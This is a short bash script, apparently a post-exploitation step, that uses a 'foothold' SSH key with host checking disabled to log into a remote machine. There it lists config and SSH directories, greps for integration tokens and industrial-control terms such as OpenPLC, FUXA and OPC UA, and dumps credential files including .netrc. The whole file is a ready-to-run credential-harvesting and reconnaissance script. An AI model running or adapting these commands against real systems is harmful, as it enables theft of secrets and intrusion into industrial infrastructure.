#!/bin/bash
KO="ssh -i $HOME/.ssh/keplerops-foothold -p 2222 -o StrictHostKeyChecking=no -o ConnectTimeout=10 rowan@10.50.13.180"
$KO '
echo "===== home"; ls -la ~
echo "===== config fieldlink"; ls -laR ~/.config/fieldlink 2>/dev/null; for f in ~/.config/fieldlink/*; do echo "## $f"; cat "$f" 2>/dev/null; done
echo "===== work tree"; find ~/work -maxdepth 3 2>/dev/null | head -80
echo "===== grep integration (home, small)"; timeout 120 grep -rioE ".{0,80}integration[_-]?token.{0,120}" ~ --exclude-dir=.cache --exclude-dir=node_modules --exclude-dir=.npm --exclude-dir=go 2>/dev/null | head -20
echo "===== grep arwc/fuxa in home"; timeout 120 grep -rliE "arwc|cairn|fuxa|opc\.tcp|openplc|ot_history" ~ --exclude-dir=.cache --exclude-dir=node_modules --exclude-dir=.git 2>/dev/null | head -40
echo "===== .ssh"; ls -la ~/.ssh
echo "===== env-ish files"; ls -la ~/.netrc ~/.npmrc ~/.git-credentials ~/.docker/config.json 2>/dev/null; cat ~/.netrc 2>/dev/null
' 2>&1
